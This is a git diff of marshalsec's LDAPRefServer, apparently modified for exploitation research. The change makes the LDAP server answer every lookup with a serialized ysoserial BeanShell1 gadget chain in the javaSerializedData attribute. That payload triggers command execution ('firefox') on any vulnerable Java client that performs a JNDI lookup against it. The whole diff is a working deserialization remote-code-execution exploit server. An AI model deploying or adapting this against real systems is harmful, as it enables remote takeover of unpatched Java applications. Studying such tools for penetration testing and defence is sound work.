@@ -23,6 +23,7 @@ SOFTWARE.
 package marshalsec.jndi;
 
 
+import java.io.*;
 import java.net.InetAddress;
 import java.net.MalformedURLException;
 import java.net.URL;
@@ -40,6 +41,7 @@ import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPException;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
+import ysoserial.payloads.BeanShell1;
 
 
 /**
@@ -55,12 +57,8 @@ public class LDAPRefServer {
 
     public static void main ( String[] args ) {
         int port = 1389;
-        if ( args.length < 1 || args[ 0 ].indexOf('#') < 0 ) {
-            System.err.println(LDAPRefServer.class.getSimpleName() + " <codebase_url#classname> [<port>]"); //$NON-NLS-1$
-            System.exit(-1);
-        }
-        else if ( args.length > 1 ) {
-            port = Integer.parseInt(args[ 1 ]);
+        if ( args.length > 0 ) {
+            port = Integer.parseInt(args[ 0 ]);
         }
 
         try {
@@ -73,7 +71,7 @@ public class LDAPRefServer {
                 SocketFactory.getDefault(),
                 (SSLSocketFactory) SSLSocketFactory.getDefault()));
 
-            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
+            config.addInMemoryOperationInterceptor(new OperationInterceptor());
             InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
             System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
             ds.startListening();
@@ -86,14 +84,11 @@ public class LDAPRefServer {
 
     private static class OperationInterceptor extends InMemoryOperationInterceptor {
 
-        private URL codebase;
-
-
         /**
          * 
          */
-        public OperationInterceptor ( URL cb ) {
-            this.codebase = cb;
+        public OperationInterceptor ( ) {
+
         }
 
 
@@ -117,20 +112,34 @@ public class LDAPRefServer {
 
 
         protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
-            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
-            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
-            e.addAttribute("javaClassName", "foo");
-            String cbstring = this.codebase.toString();
-            int refPos = cbstring.indexOf('#');
-            if ( refPos > 0 ) {
-                cbstring = cbstring.substring(0, refPos);
-            }
-            e.addAttribute("javaCodeBase", cbstring);
-            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
-            e.addAttribute("javaFactory", this.codebase.getRef());
+            System.out.println("Send LDAP reference serialized " + "BeanShell1");
+            e.addAttribute("javaClassName", "java.util.PriorityQueue");
+            e.addAttribute("javaSerializedData", getObjectData());
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         }
 
+        private byte[] getObjectData(){
+            ByteArrayOutputStream bos = new ByteArrayOutputStream();
+            ObjectOutput out = null;
+            byte[] theBytes = null;
+            try {
+                out = new ObjectOutputStream(bos);
+                out.writeObject(new BeanShell1().getObject("firefox"));
+                out.flush();
+                theBytes = bos.toByteArray();
+            } catch (IOException e) {
+                e.printStackTrace();
+            } catch (Exception e) {
+                e.printStackTrace();
+            } finally {
+                try {
+                    bos.close();
+                } catch (IOException ex) {
+                    // ignore close exception
+                }
+            }
+            return theBytes;
+        }
     }
 }
